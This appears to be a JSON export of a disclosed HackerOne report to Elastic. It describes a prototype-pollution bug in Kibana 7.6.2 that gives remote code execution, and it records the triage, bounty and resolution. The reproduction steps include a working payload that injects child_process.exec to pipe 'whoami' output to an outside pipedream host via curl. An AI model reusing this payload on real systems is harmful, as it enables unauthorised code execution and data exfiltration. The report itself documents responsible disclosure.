@@ -1,0 +1,477 @@
+{
+  "id": 852613,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NTI2MTM=",
+  "url": "https://hackerone.com/reports/852613",
+  "title": "Remote Code Execution on Cloud via latest Kibana 7.6.2",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2020-04-17T22:49:58.303Z",
+  "submitted_at": "2020-04-17T22:49:58.303Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "alexbrasetvik",
+    "url": "/alexbrasetvik",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/AMYBseEiuZm6mtG4rfyRgTBu/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23607,
+    "url": "https://hackerone.com/elastic",
+    "handle": "elastic",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/607/c5cce6a2e2d95af85e014db95c2d7560e73e9bec_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/607/c5cce6a2e2d95af85e014db95c2d7560e73e9bec_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Elastic",
+      "twitter_handle": "elastic",
+      "website": "https://www.elastic.co/",
+      "about": "Search, solve, and succeed with one platform, three search-powered solutions, built on a single technology stack"
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2020-07-28T19:45:35.016Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-07-28T19:45:34.744Z",
+  "team_member_agreed_on_going_public_at": "2020-07-28T18:22:14.238Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:** A prototype pollution in Kibana can be used to gain remote code execution.\n\n**Description:**\n\nThere is a prototype pollution bug in the upgrade assistant's telemetry collector, via a dangerous usage of `_.set`: https://github.com/elastic/kibana/blob/master/x-pack/plugins/upgrade_assistant/server/lib/telemetry/usage_collector.ts#L93\n\nWe can pollute the prototype by providing a specially crafted \"upgrade-assistant-telemetry\" \"saved object\".\n\nThe attached video provides a walkthrough. There is a bit of waiting involved at one point, I included the entire thing for completeness with a hint of when you can fast forward :) \n\n## Steps To Reproduce:\n\nThe following assumes an otherwise empty Kibana. If any steps breaks Kibana, you can `DELETE /.kibana*` and restart it to get going again.\n\n  1. Update the kibana mappings so we can provide our \"upgrade-assistant-telemetry\" document. It's important to provide the full mapping and not just do a dynamic one, or Kibana can refuse to start up due to err-ing when validating mappings\n\n```\nPUT /.kibana_1/_mappings\n{\n  \"properties\": {\n    \"upgrade-assistant-telemetry\": {\n      \"properties\": {\n        \"constructor\": {\n          \"properties\": {\n            \"prototype\": {\n              \"properties\": {\n                \"sourceURL\": {\n                  \"type\": \"text\",\n                  \"fields\": {\n                    \"keyword\": {\n                      \"type\": \"keyword\",\n                      \"ignore_above\": 256\n                    }\n                  }\n                }\n              }\n            }\n          }\n        },\n        \"features\": {\n          \"properties\": {\n            \"deprecation_logging\": {\n              \"properties\": {\n                \"enabled\": {\n                  \"type\": \"boolean\",\n                  \"null_value\": true\n                }\n              }\n            }\n          }\n        },\n        \"ui_open\": {\n          \"properties\": {\n            \"cluster\": {\n              \"type\": \"long\",\n              \"null_value\": 0\n            },\n            \"indices\": {\n              \"type\": \"long\",\n              \"null_value\": 0\n            },\n            \"overview\": {\n              \"type\": \"long\",\n              \"null_value\": 0\n            }\n          }\n        },\n        \"ui_reindex\": {\n          \"properties\": {\n            \"close\": {\n              \"type\": \"long\",\n              \"null_value\": 0\n            },\n            \"open\": {\n              \"type\": \"long\",\n              \"null_value\": 0\n            },\n            \"start\": {\n              \"type\": \"long\",\n              \"null_value\": 0\n            },\n            \"stop\": {\n              \"type\": \"long\",\n              \"null_value\": 0\n            }\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n  2. With the mapping ready, we can index our own telemetry status doc:\n\n```\nPUT /.kibana_1/_doc/upgrade-assistant-telemetry:upgrade-assistant-telemetry\n{\n    \"upgrade-assistant-telemetry\" : {\n      \"ui_open.overview\" : 1,\n      \"ui_open.cluster\" : 1,\n      \"ui_open.indices\" : 1,\n      \"constructor.prototype.sourceURL\": \"\\u2028\\u2029\\nglobal.process.mainModule.require('child_process').exec('whoami | curl https://enba5g2t13nue.x.pipedream.net/ -d@-')\"\n    },\n    \"type\" : \"upgrade-assistant-telemetry\",\n    \"updated_at\" : \"2020-04-17T20:47:40.800Z\"\n  }\n```\n\nThe payload pollutes the prototype, which in turn injects Javascript that spawns a shell process, in this case `whoami | curl https://enba5g2t13nue.x.pipedream.net/ -d@-`\n\n  3. Wait until collection happens again, or just restart Kibana. In the video I restart Kibana, which you can do via the cloud console. Go to `https://cloud.elastic.co/deployments/[your id]/kibana` and click \"Force Restart\".\n\n  4. Kibana will take about a minute to start. Soon after starting, it'll do a telemetry collection run, that'll cause the above code to be injected and that will run the shell code.\n\nKibana will likely keep starting, run this, crash then restart. I cleaned up my deployment so it's not in a crash-restart loop.\n\n## Impact\n\nAny cloud user can get remote code execution, as can any on-prem Kibana user that has x-pack installed.\n\n## Supporting Material/References:\n\nThe attached video recording walks through the entire attack chain.\n\n## Impact\n\nAny cloud user can get remote code execution, as can any on-prem Kibana user that has x-pack installed.",
+  "bounty_amount": "10000.0",
+  "formatted_bounty": "$10,000",
+  "weakness": {
+    "id": 75,
+    "name": "Privilege Escalation"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 793310,
+      "file_name": "Cloud_RCE__Kibana_7.6.2.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/mUya5SP9UDtUES23MjMCXQeq?response-content-disposition=attachment%3B%20filename%3D%22Cloud_RCE__Kibana_7.6.2.mp4%22%3B%20filename%2A%3DUTF-8%27%27Cloud_RCE__Kibana_7.6.2.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRWDIYOMA%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T072608Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEC8aCXVzLXdlc3QtMiJHMEUCIFNLdnPGtLwKMqDt0NQfrZo0FnfieCdt70b8x7mZltnYAiEAvoj8eBF%2Fz9RmxiwioQTjaAkY5y8glP7YJHIdVEiSRjIqsgUIKBADGgwwMTM2MTkyNzQ4NDkiDKwmuAj4%2Be1s5lbylSqPBcomyuxhildk0NUANV3%2BftlYYJCWX1M%2B1xqa23Q06%2By7YS%2BQATcLYhjMRKLHIGZfd3bianhW%2FgdFm4gpQAmwDHRw2igbV1zSavkNvXqacnFdw4Oln9SHRd2e4zuwk%2F2GviKwn1nZunhhdOuu6g7A2DA%2FQefyAlyQYpy%2FHRGl7J9kIPlFGlBK9CAul0kzKyTjlygr3Hz7DB5F6X4FcS71gvzmFC%2Fa6bf1tdfq46kICi9nBXV8Yep%2FEmkoi%2FkPVN6jpqZHrrqGL%2BeKOCEw6yXkZefklvRs%2Bmud%2BPdLs6D35uN9GpF0h2lyRl7mI1tGYSVdAxrxhb%2FnLZ%2BBbcvE%2FzPbIbOkYt%2F4kzBjPA33r7a6gRZo6xBI%2BqcHTUEoZlsC%2FePoA0bzI%2BY%2B9Kn7r266PdCrFtOI0TtLDtrt1a%2FsYB7r39ZReNeBUZjFy71DofxHhuMplWoZ%2B5suYOSkCpnX8ox%2FexG03tPH%2B%2BYi%2B7JKgMNo8Ywg0LUY4FIgqUOY3m9G4vsQ2yNVvhHzc1zFQ%2BaZDinuNqUJycV22%2Bal4yI7Vu8zRPT0XS8nU9mRxPyMOxBhqiEpipRhHvEk6ruVgSYpVrhEqZHRnwv%2FiS2CGZuiFnzVyfzzNc0a1K3NA%2Bqp8X%2FGc2IrCqLgJiIar1EgInaI6d3yXHytJb5boQ1Ym5HsML5oSphvP1hBCFvgtrkpt3teC9sz%2F02EwDEGzubXTtTxqnHBOiqeNpfNEReBvGYlciW1L%2FxLQxgqD5RpQ5CUBnf67bJivw%2BtoZ%2BpV3UvOdvkG99R3Yb6KV5k2Ly3LruRvseHIOA2KILhuT0Arnm9FUq1BvuB593ehUm8src6x4P2nT6wjhA9E2kekyi7othxiuSueSwwyp66qAY6sQGfl2fsTY6VWTPrJHQD%2BPDh1xgsgnaytGIcrwK1OGEf8WVcLpw6bEJ6BKLFS7l9GZDwFvjz7J48x%2Bl7YfFRkEZXRmoO3ak0duYeBuy3U2I6DbXdUZZIWlnrcVoExjgWQHiADxJVCKngMqQP1GNwrY9M5Of5s5Z3zUQwD3EqxVcljRFvNHznFkHj8b2eCVcdpPMI6JyXX4H9nyjUW4XvHJwg%2F0AQay6G%2BksUHKVQvEI2UA4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5755018c6b3dcdd4399112227511031ba15521dc5036f95c2bed36eb14ed9f55",
+      "file_size": 42783887,
+      "type": "video/mp4",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-08-27T18:22:14.371Z",
+  "allow_singular_disclosure_after": -96901433.97462094,
+  "singular_disclosure_allowed": true,
+  "vote_count": 17,
+  "voters": [
+    "alexbrasetvik",
+    "n1m0",
+    "haxor31337",
+    "dee-see",
+    "iamnoooob",
+    "trieulieuf9",
+    "s1r1u5",
+    "rzx007x",
+    "dmc3",
+    "aryan2808",
+    "and 7 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 4424,
+    "asset_type": "URL",
+    "asset_identifier": "cloud.elastic.co",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 7701834,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "The account I used has user_id 1710521131 and email \"█████\". \n\nThe Kibana is https://02fde216d8bd4831b1976b87404aedf9.eu-central-1.aws.cloud.es.io and ES is at https://da78cc790f1b4066adb86c340f7bb014.eu-central-1.aws.cloud.es.io\n\nNo other clusters or accounts were involved. I have not run any other shell commands than the provided `whoami | curl …`",
+      "automated_response": false,
+      "created_at": "2020-04-17T22:56:21.986Z",
+      "updated_at": "2020-07-28T20:07:57.016Z",
+      "actor": {
+        "username": "alexbrasetvik",
+        "cleared": false,
+        "verified": false,
+        "url": "/alexbrasetvik",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/AMYBseEiuZm6mtG4rfyRgTBu/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "elastic"
+    },
+    {
+      "id": 7701917,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Damn, @alexbrasetvik, you are unstoppable! Seriously impressive find! 💪🏻",
+      "automated_response": false,
+      "created_at": "2020-04-17T23:16:35.094Z",
+      "updated_at": "2020-04-17T23:16:35.094Z",
+      "actor": {
+        "username": "kovyrin",
+        "cleared": false,
+        "verified": false,
+        "url": "/kovyrin",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/n89rkdmYvMH8uKPntMaczq3W/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "elastic"
+    },
+    {
+      "id": 7714866,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @alexbrasetvik,\n\nThank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\n\nKind regards,\n@nochnoidozor",
+      "automated_response": false,
+      "created_at": "2020-04-19T15:56:47.056Z",
+      "updated_at": "2020-04-19T15:56:47.056Z",
+      "actor": {
+        "username": "nochnoidozor",
+        "cleared": false,
+        "verified": false,
+        "url": "/nochnoidozor",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "elastic"
+    },
+    {
+      "id": 7714919,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hey @alexbrasetvik,\n\nGreat find! And thanks for the well put together video PoC. It's useful for troglodytes like myself :)\n\nI have indeed verified this, and I'll be putting this through the necessary steps tomorrow morning. Hang tight until then! ",
+      "automated_response": false,
+      "created_at": "2020-04-19T16:04:43.632Z",
+      "updated_at": "2020-04-19T16:04:43.632Z",
+      "actor": {
+        "username": "douglas_day",
+        "cleared": false,
+        "verified": false,
+        "url": "/douglas_day",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/1ALNLRqrFXt23SDSBvAqPZAH/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "elastic"
+    },
+    {
+      "id": 7724500,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "We've got folks working on this - I'll let you know when we're ready for you to re-test.\n\nI'll also have the bounty ready in the next day or so!",
+      "automated_response": false,
+      "created_at": "2020-04-20T12:25:03.834Z",
+      "updated_at": "2020-04-20T12:25:03.834Z",
+      "actor": {
+        "username": "douglas_day",
+        "cleared": false,
+        "verified": false,
+        "url": "/douglas_day",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/1ALNLRqrFXt23SDSBvAqPZAH/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "elastic"
+    },
+    {
+      "id": 7725014,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thanks for the quick update :)",
+      "automated_response": false,
+      "created_at": "2020-04-20T13:01:33.157Z",
+      "updated_at": "2020-04-20T13:01:33.157Z",
+      "actor": {
+        "username": "alexbrasetvik",
+        "cleared": false,
+        "verified": false,
+        "url": "/alexbrasetvik",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/AMYBseEiuZm6mtG4rfyRgTBu/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "elastic"
+    },
+    {
+      "id": 7725713,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BountyAwarded",
+      "message": "Hey @alexbrasetvik ,\n\n>Thanks for the quick update :)\n\nHow about an even quicker bounty? ;)\n\nFirst off - thanks again for reporting this. You've set a pretty high standard and I expected no less from you :)\n\nBeing remote-code execution on our Cloud environment, we do believe this falls under `Critical` severity.\n\nAdditionally, being the first RCE we've received, this report qualifies for the `Elastic It To The Man` bonus.\n\nThanks again for your contribution and I'll update you once we need you to re-test.",
+      "automated_response": false,
+      "created_at": "2020-04-20T14:06:05.987Z",
+      "updated_at": "2020-04-20T14:06:05.987Z",
+      "actor": {
+        "url": "/elastic",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/607/c5cce6a2e2d95af85e014db95c2d7560e73e9bec_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "Elastic"
+        }
+      },
+      "bounty_amount": "5000.0",
+      "bonus_amount": "5000.0",
+      "bounty_currency": "usd",
+      "genius_execution_id": null,
+      "team_handle": "elastic",
+      "collaborator": {
+        "username": "alexbrasetvik",
+        "url": "/alexbrasetvik"
+      }
+    },
+    {
+      "id": 7726368,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Wow, thanks a lot for the bounty and bonus :)\n\nHappy to retest when you're ready. :)",
+      "automated_response": false,
+      "created_at": "2020-04-20T14:11:39.321Z",
+      "updated_at": "2020-04-20T14:11:39.321Z",
+      "actor": {
+        "username": "alexbrasetvik",
+        "cleared": false,
+        "verified": false,
+        "url": "/alexbrasetvik",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/AMYBseEiuZm6mtG4rfyRgTBu/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "elastic"
+    },
+    {
+      "id": 7726742,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Well deserved. Find more prototype pollution :)\n\n-Tony",
+      "automated_response": false,
+      "created_at": "2020-04-20T14:47:00.981Z",
+      "updated_at": "2020-04-20T14:47:00.981Z",
+      "actor": {
+        "username": "anthony_meehan",
+        "cleared": false,
+        "verified": false,
+        "url": "/anthony_meehan",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "elastic"
+    },
+    {
+      "id": 8772180,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-07-27T21:09:05.135Z",
+      "updated_at": "2020-07-27T21:09:05.135Z",
+      "actor": {
+        "username": "douglas_day",
+        "cleared": false,
+        "verified": false,
+        "url": "/douglas_day",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/1ALNLRqrFXt23SDSBvAqPZAH/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "alexbrasetvik",
+        "url": "/alexbrasetvik"
+      },
+      "genius_execution_id": null,
+      "team_handle": "elastic"
+    },
+    {
+      "id": 8784030,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-07-28T18:22:14.264Z",
+      "updated_at": "2020-07-28T18:22:14.264Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "douglas_day",
+        "cleared": false,
+        "verified": false,
+        "url": "/douglas_day",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/1ALNLRqrFXt23SDSBvAqPZAH/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "elastic"
+    },
+    {
+      "id": 8785011,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "@douglas_day Can you edit out my email address? I don’t seem able to.",
+      "automated_response": false,
+      "created_at": "2020-07-28T19:45:34.784Z",
+      "updated_at": "2020-07-28T19:45:34.784Z",
+      "actor": {
+        "username": "alexbrasetvik",
+        "cleared": false,
+        "verified": false,
+        "url": "/alexbrasetvik",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/AMYBseEiuZm6mtG4rfyRgTBu/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "elastic"
+    },
+    {
+      "id": 8785012,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-07-28T19:45:35.058Z",
+      "updated_at": "2020-07-28T19:45:35.058Z",
+      "actor": {
+        "username": "alexbrasetvik",
+        "cleared": false,
+        "verified": false,
+        "url": "/alexbrasetvik",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/AMYBseEiuZm6mtG4rfyRgTBu/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "elastic"
+    },
+    {
+      "id": 8785177,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "done :) ",
+      "automated_response": false,
+      "created_at": "2020-07-28T20:08:15.062Z",
+      "updated_at": "2020-07-28T20:08:15.062Z",
+      "actor": {
+        "username": "douglas_day",
+        "cleared": false,
+        "verified": false,
+        "url": "/douglas_day",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/1ALNLRqrFXt23SDSBvAqPZAH/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "elastic"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
